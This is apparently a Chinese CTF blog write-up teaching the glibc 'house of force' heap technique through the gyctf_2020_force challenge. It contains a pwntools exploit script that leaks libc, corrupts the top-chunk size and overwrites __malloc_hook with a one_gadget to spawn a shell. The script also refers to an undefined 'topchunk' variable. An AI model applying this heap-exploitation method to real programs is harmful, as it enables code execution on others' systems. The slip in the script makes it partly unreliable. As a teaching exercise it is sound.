---
title: 一道题学习house of force
date: 2020-05-9 23:49:56
tags: pwn
---
house of force攻击手段是通过操作top chunk来进行利用的<!--more-->  
top chunk是作为备用的堆空间，当需要申请chunk时，所有bins中的chunk都满足不了所需的size时，就会从top chunk中切割一块chunk出来返回给用户。  
贴上源码  
```cpp  
victim = av->top;
size   = chunksize(victim);
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```  
👴看不懂，也懒得看，直接解释  
首先会检查申请的size，top chunk够不够给，如果够，就会把原先top chunk的head，变成新申请的chunk的head，并且以新申请的size为offset，把top chunk推到新的位置  
house of force就是通过把top chunk推到任意位置，来控制目标内存  
而且通过malloc不同的size，我们既可以把top chunk推到更高的地址，也可以把它送到更低的地址  
我们的利用思路可以简单概括为，将top chunk的size改为-1，然后-1就会被解释为一个大数，然后可以使得所有64位值都能通过验证  
## gyctf_2020_force  
这题就是通过house of force来做  
首先分析下函数  
![](force1.png)
![](force2.png)
只有add一个功能，puts是空壳函数  
程序在申请chunk后，会打印出chunk的地址，那么我们申请一个大块的空间，系统就会用mmap分配，mmap分配的这块区域在libc下方，偏移是固定的，我们就可以算出libc_base  
然后不管申请多大的chunk，都能读入0x50，那这里就存在溢出，我们通过这个溢出，把top chunk的size改为0xffffffffffffffff，那我们就可以申请很大的size了，我们申请一个size为malloc_hook何top chunk之间的偏移的chunk，那么就能将top chunk推到malloc_hook附近  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './gyctf_2020_force' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",26629)
elf=ELF(binary)
libc=elf.libc
def add(size,content):
    p.recvuntil("puts")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(size))
    p.recvuntil("content")
    p.send(content)
def exp():
    p.recvuntil("puts")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(2000000))
    p.recvuntil('bin addr ')
    addr = int(p.recv(14),16)
    print hex(addr)
    libc_base = addr + 0x1e8ff0
    log.success("libc_base==>" + hex(libc_base))
    #gdb.attach(p)
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    log.success("malloc_hook==>" + hex(malloc_hook))
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + 0x4526a
    p.recvuntil("content")
    p.send("a")
    payload = p64(0)*5 + p64(0xffffffffffffffff)
    p.recvuntil("puts")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(0x20))
    p.recvuntil('bin addr ')
    heap_base = int(p.recv(14),16) - 0x10 + 0x30 #加上0x30就到了top chunk的位置
    print "heap_base:" + hex(heap_base)
    p.send(payload)
    size = (malloc_hook -0x20) - (topchunk+0x10) #需要realloc调整栈帧，所以申请malloc_hook-0x20
    print size
    gdb.attach(p)
    add(size,"aa")
    pause()
    add(0x20,'a'*8+p64(one_gadget)+p64(realloc+16))
    p.recvuntil("puts")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(0x10))
    #gdb.attach(p)
    p.interactive()
exp()
```  
参考链接:   
https://bbs.pediy.com/thread-222924.htm  
https://www.anquanke.com/post/id/175630  